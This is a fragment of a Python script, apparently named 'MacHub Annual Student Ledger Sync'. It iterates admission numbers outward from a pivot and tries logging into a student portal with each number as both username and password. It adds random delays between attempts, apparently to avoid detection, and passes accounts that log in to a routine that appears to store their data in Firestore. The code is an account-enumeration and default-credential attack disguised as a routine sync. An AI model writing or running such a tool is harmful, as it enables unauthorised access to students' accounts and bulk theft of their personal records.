    label = "FORWARD" if direction > 0 else "BACKWARD"
    log.info("\n=== %s walk from pivot %d ===", label, pivot)

    consec = 0
    cur    = pivot + direction

    while consec < MAX_CONSECUTIVE_FAILURES:
        time.sleep(random.uniform(JITTER_MIN, JITTER_MAX))
        stats.attempted += 1
        probe = _attempt_login(str(cur), str(cur))

        if not probe.success:
            consec += 1
            stats.failed += 1
            log.debug("  [%s] FAIL %s (%d/%d)", label, cur, consec, MAX_CONSECUTIVE_FAILURES)
        elif not probe.is_student:
            consec = 0
            stats.skipped += 1
            if probe.session:
                probe.session.close()
        else:
            consec = 0
            if _process_student(cur):
                stats.succeeded += 1
                stats.discovered.append(str(cur))
            else:
                stats.failed += 1
            time.sleep(random.uniform(1.5, 3.0))

        cur += direction

    log.info("%s walk halted after %d consecutive failures (last tried: %s)", label, MAX_CONSECUTIVE_FAILURES, cur)


# ==============================================================================
#  MAIN
# ==============================================================================

def main() -> None:
    log.info("=" * 60)
    log.info("  MacHub Annual Student Ledger Sync  --  v2.0.0")
    log.info("  Pivot: %d  |  Halt after: %d failures/direction", PIVOT_ADM, MAX_CONSECUTIVE_FAILURES)
    log.info("  Firestore SDK available: %s", FIRESTORE_AVAILABLE)
    log.info("=" * 60)

    # Validate Firestore connectivity before starting expensive walk
    if FIRESTORE_AVAILABLE:
        if _init_firestore() is None:
            log.error("Aborting -- Firestore failed to init. Check FIREBASE_SERVICE_ACCOUNT secret.")
            sys.exit(1)
    else:
        log.warning("Running in DRY-RUN mode -- no cloud writes (install google-cloud-firestore)")

    # Process pivot student
    log.info("\n--- Processing PIVOT student %d ---", PIVOT_ADM)
    stats = WalkStats()
    stats.attempted += 1
    if _process_student(PIVOT_ADM):
        stats.succeeded += 1
        stats.discovered.append(str(PIVOT_ADM))
    else:
        stats.failed += 1

    run_start = time.time()

    # Backward walk: pivot-1, pivot-2, ...
    _walk(PIVOT_ADM, direction=-1, stats=stats)

    # Forward walk:  pivot+1, pivot+2, ...
    _walk(PIVOT_ADM, direction=+1, stats=stats)

    elapsed = time.time() - run_start

    log.info("\n" + "=" * 60)
    log.info("  SYNC COMPLETE")
    log.info("  Elapsed   : %.1f min", elapsed / 60)
    log.info("  Attempted : %d", stats.attempted)
    log.info("  Succeeded : %d", stats.succeeded)
    log.info("  Skipped   : %d (non-students)", stats.skipped)
    log.info("  Failed    : %d", stats.failed)
    log.info("  IDs found : %s", ", ".join(stats.discovered[:30]))
    log.info("=" * 60)

    if stats.succeeded == 0:
        log.error("Zero students synced. Verify portal reachability and credentials.")
        sys.exit(1)


if __name__ == "__main__":
    main()
